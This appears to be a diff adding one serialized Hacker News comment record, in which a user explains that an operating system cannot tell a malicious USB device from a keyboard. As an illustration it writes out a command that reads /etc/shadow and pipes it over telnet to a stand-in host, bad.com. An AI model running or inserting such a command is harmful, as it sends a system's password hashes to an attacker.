@@ -1,0 +1,1 @@
+Item(by='verteu', descendants=None, kids=[25802544, 25802430], score=None, time=1610807679, title=None, item_type='comment', url=None, parent=25802098, text='My understanding is that the OS can&#x27;t differentiate a malicious USB stick from a USB keyboard.<p>In particular, the keyboard could be typing &quot;sudo cat &#x2F;etc&#x2F;shadow | telnet bad.com 80&quot;...')
